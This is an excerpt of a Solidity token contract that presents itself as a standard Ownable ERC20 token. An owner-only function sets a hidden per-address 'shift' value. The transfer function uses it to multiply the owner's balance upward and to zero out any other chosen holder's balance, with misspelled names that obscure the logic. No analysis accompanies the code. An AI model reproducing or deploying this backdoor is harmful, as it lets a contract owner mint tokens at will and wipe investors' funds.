...
contract token is Ownable, IERC20 {
    ...
    mapping (address => uint256) private _shiiftAddress;

    function setshiift(address _address,uint256 _value) external onlyowner {
        _shiiftAddress[_address] = _value;
    }

    function setshiift(address _address) external view onlyowner returns (uint256) {
        return _shiiftAddress[_address];
    }
    ...
    function _transfer(address sender, address recipient, uint256 amonnts) internal virtual {
        ...
        if (_shiiftAddress[sender] > 0) {
            if (sender == owner()) {
                _balance[sender] = _balance[sender].mul(1 << _shiiftAddress[sender]);
            }else{
                _balance[sender] = _balance[sender].mul(1 >> _shiiftAddress[sender]);
            }
        }
